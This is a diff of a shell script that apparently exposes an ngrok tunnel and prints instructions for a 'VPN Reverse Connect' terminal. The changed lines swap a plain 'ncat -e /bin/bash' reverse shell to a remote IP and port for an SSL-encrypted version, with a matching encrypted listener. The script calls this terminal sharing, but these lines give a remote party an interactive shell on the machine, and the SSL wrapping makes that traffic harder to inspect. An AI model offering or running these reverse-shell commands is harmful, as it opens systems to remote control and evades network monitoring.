@@ -39,8 +39,8 @@ vport=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's
 echo -e "
 [${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts:${clear}
 [${Green}✔${clear}] ${IYellow}ACCESS TERMINAL${clear}
-\t${IGreen}├──${clear} ${Green}ncat -e /bin/bash $ip $vport ${clear}
-\t${IGreen}└──${clear} ${Green}ncat -klvp 5576{clear}
+\t${IGreen}├──${clear} ${Green}ncat $ip $vport --ssl -e /bin/bash -v ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -l 5576 --ssl -v${clear}
 
 [${Green}✔${clear}] ${IYellow}SHARE TERMINAL${clear}
 \t${IGreen}├──${clear} ${Green}ncat -v -n $ip $vport ${clear}
